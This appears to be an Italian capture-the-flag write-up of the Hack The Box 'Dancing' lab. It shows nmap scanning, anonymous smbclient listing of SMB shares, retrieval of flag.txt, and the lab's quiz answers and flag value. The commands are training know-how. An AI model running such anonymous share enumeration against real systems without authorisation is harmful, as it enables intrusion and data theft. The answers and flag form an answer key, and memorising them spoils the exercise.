# HTB Starting Point – Dancing

Difficoltà: Very Easy  
Data: 14/11/2025  

---

## Connessione alla VPN

È stato utilizzato lo stesso file `.ovpn` già presente nella directory `sf_shared` della VM Kali Linux.  
La connessione alla VPN di Hack The Box è stata avviata con:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon

IP assegnato: 10.10.15.9  
Target: 10.129.3.9

---

## Verifica della Connettività

ping -c 5 10.129.3.9  
PING 10.129.3.9 (10.129.3.9) 56(84) bytes of data.  
64 bytes from 10.129.3.9: icmp_seq=1 ttl=127 time=58.4 ms  
64 bytes from 10.129.3.9: icmp_seq=2 ttl=127 time=58.5 ms  
64 bytes from 10.129.3.9: icmp_seq=3 ttl=127 time=58.4 ms  
64 bytes from 10.129.3.9: icmp_seq=4 ttl=127 time=59.1 ms  
64 bytes from 10.129.3.9: icmp_seq=5 ttl=127 time=57.9 ms

--- 10.129.3.9 ping statistics ---  
5 packets transmitted, 5 received, 0% packet loss  
rtt min/avg/max/mdev = 57.858/58.447/59.080/0.388 ms

Il target risponde correttamente.

---

## Scansione delle Porte

È stata eseguita una scansione con rilevamento versione:

nmap -sV 10.129.3.9  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) )  
Host is up (0.068s latency).  
Not shown: 996 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service Info: OS: Windows

Porte aperte confermate:  
135/tcp • msrpc  
139/tcp • netbios-ssn  
445/tcp • microsoft-ds  
5985/tcp • http (Windows)

---

## Task di Verifica

### Task 1 – Significato dell’acronimo SMB

Risposta: Server Message Block  
Stato: Corretta

---

### Task 2 – Porta su cui opera SMB

Risposta: 445/tcp  
Stato: Corretta

---

### Task 3 – Nome del servizio sulla porta 445

Risposta: microsoft-ds  
Stato: Corretta

---

### Task 4 – Flag dell’utility smbclient per elencare le condivisioni

Risposta: -l  
Stato: Corretta

---

### Task 5 – Numero totale delle condivisioni disponibili

Risposta: 4

Evidenza:

smbclient -L 10.129.3.9  
Sharename:  
ADMIN$  
C$  
IPC$  
WorkShares

---

### Task 6 – Condivisione accessibile senza password

Risposta: WorkShares  
Stato: Corretta

---

### Task 7 – Comando SMB per scaricare i file

Risposta: get  
Stato: Corretta

---

### Task 8 – Root Flag

Connessione alla condivisione:

smbclient //10.129.3.9/WorkShares -N

All’interno della share è stato individuato il percorso:

WorkShares → James.P → flag.txt

Evidenza:

smb: > ls  
smb: > cd James.P\  
smb: \James.P> ls  
flag.txt trovato

Download del file:

smb: \James.P> get flag.txt

Lettura della flag:

cat flag.txt  
5f61c10dffbc77a704d76016a22f1664

Flag: 5f61c10dffbc77a704d76016a22f1664  
Stato: Corretta

---

## Note

La macchina mostra i rischi legati a condivisioni SMB non protette, accessibili senza autenticazione.  
L’esposizione della porta 445 insieme all’accesso anonimo rende possibile navigare nelle directory interne e recuperare file sensibili.

---

## Author

Report by delerico
